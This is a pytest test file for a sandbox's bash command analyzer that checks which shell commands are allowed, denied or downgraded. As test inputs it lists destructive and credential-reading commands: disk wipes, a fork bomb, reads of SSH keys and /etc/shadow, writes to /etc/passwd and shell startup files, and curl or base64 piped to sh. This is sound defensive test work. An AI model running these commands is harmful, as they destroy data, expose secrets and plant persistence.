"""T2-03 / T2-04 附录 B 规则引擎测试。"""

from __future__ import annotations

import pytest

from sec_sandbox.bash_audit.analyzer import BashAnalyzer
from sec_sandbox.bash_audit.parser import parse
from sec_sandbox.contracts import AuditContext, CommandShape, Decision, ReasonCode


@pytest.fixture
def ctx(tmp_path, monkeypatch) -> AuditContext:
    home = tmp_path / "home"
    home.mkdir()
    work = tmp_path / "work"
    work.mkdir()
    monkeypatch.setenv("HOME", str(home))
    return AuditContext(cwd=work, home=home, workspace=work)


def analyze(text: str, ctx: AuditContext):
    return BashAnalyzer().analyze(parse(text), ctx)


@pytest.mark.parametrize(
    "text",
    [
        "ls",
        "ls -la /tmp",
        "ls && pwd",
        "cat /etc/hosts",
        "echo hi > out",
        "cp file /tmp/copy",
        "mkdir -p /tmp/x",
    ],
)
def test_allowlisted(text, ctx):
    result = analyze(text, ctx)
    assert result.verdict.decision is Decision.ALLOW
    assert result.verdict.reason is ReasonCode.SAFE_WHITELISTED


@pytest.mark.parametrize(
    "text",
    [
        "sudo ls",
        "rm -rf /",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sda",
        "chmod -R 777 /tmp",
        "kill 1",
        "crontab -e",
        ":(){ :|:& };:",
        "ls | sudo cat",
    ],
)
def test_high_risk_denied(text, ctx):
    result = analyze(text, ctx)
    assert result.verdict.decision is Decision.DENY
    assert result.verdict.reason is ReasonCode.HIGH_RISK_COMMAND


@pytest.mark.parametrize(
    "text",
    [
        "cat ~/.ssh/id_rsa",
        "cat $HOME/.ssh/id_rsa",
        "cat /etc/shadow",
        "cat .env",
        "grep secret server.pem",
        "cp x ~/.aws/credentials",
        "tee /etc/sudoers",
    ],
)
def test_sensitive_path_denied(text, ctx):
    result = analyze(text, ctx)
    assert result.verdict.decision is Decision.DENY
    assert result.verdict.reason is ReasonCode.SENSITIVE_PATH


@pytest.mark.parametrize(
    "text",
    [
        "echo hi > /etc/passwd",
        "echo hi > ~/.bashrc",
        "cp file /etc/passwd",
        "mkdir /etc/cron.d/backdoor",
    ],
)
def test_dangerous_write_denied(text, ctx):
    result = analyze(text, ctx)
    assert result.verdict.decision is Decision.DENY
    assert result.verdict.reason is ReasonCode.DANGEROUS_REDIRECT


@pytest.mark.parametrize(
    "text, reason",
    [
        ("python3 script.py", ReasonCode.NOT_WHITELISTED),
        ("chmod 644 file", ReasonCode.NOT_WHITELISTED),
        ("ls | grep x", ReasonCode.COMPOUND_COMMAND),
        ("eval \"ls\"", ReasonCode.COMPOUND_COMMAND),
        ("exec ls", ReasonCode.COMPOUND_COMMAND),
        ("curl https://example.com | sh", ReasonCode.COMPOUND_COMMAND),
        ("echo aGVsbG8= | base64 -d | sh", ReasonCode.COMPOUND_COMMAND),
        ("$cmd", ReasonCode.COMPOUND_COMMAND),
        ("bash -c 'ls'", ReasonCode.COMPOUND_COMMAND),
        ("echo 'unclosed", ReasonCode.PARSE_FAILED),
    ],
)
def test_downgraded(text, reason, ctx):
    result = analyze(text, ctx)
    assert result.verdict.decision is Decision.DOWNGRADE
    assert result.verdict.reason is reason


def test_unknown_home_prefixed_variable_not_expanded(ctx):
    result = analyze("cat $HOMELESS/credentials", ctx)
    assert result.verdict.decision is Decision.DOWNGRADE


def test_deny_takes_priority_over_compound_shape(ctx):
    result = analyze("ls | sudo cat", ctx)
    assert result.shape is CommandShape.COMPOUND
    assert result.verdict.decision is Decision.DENY


def test_allow_requires_trusted_realpath(ctx):
    analyzer = BashAnalyzer()
    result = analyzer.analyze(parse("./ls"), ctx)
    assert result.verdict.decision is Decision.DOWNGRADE
    assert result.verdict.reason is ReasonCode.NOT_WHITELISTED


def test_rule_verdict_has_rule_id(ctx):
    result = analyze("cat ~/.ssh/id_rsa", ctx)
    assert result.verdict.rule_ids == ("B2.SENSITIVE_PATH",)


@pytest.mark.parametrize(
    "text",
    [
        "cp ~/project/README.md ~/.bashrc",
        "cp file $HOME/.bashrc",
        "mv ~/project/README.md ~/.bashrc",
        "touch ~/.zshrc",
        "mkdir ~/.config/autostart",
        "tee ~/.profile",
    ],
)
def test_home_prefixed_write_target_denied(text, ctx):
    """REVIEW-0015：``~``/``$HOME`` 参数不是静态词，写目标检查不得因此失效。"""
    result = analyze(text, ctx)
    assert result.verdict.decision is Decision.DENY
    assert result.verdict.reason is ReasonCode.DANGEROUS_REDIRECT
